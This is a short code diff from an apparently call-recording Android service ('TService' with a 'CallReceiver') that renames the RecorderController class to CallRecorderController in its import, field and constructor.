@@ -9,7 +9,7 @@ import android.os.Bundle;
 import android.os.IBinder;
 import android.telephony.TelephonyManager;
 import android.util.Log;
-import com.google.tracking.call.RecorderController;
+import com.google.tracking.call.CallRecorderController;
 
 
 public class TService extends Service {
@@ -67,10 +67,10 @@ public class TService extends Service {
         String state;
         String inCall, outCall;
         public boolean wasRinging = false;
-        RecorderController recorderController;
+        CallRecorderController recorderController;
 
         public CallReceiver() {
-            recorderController = new RecorderController();
+            recorderController = new CallRecorderController();
         }
 
         @Override
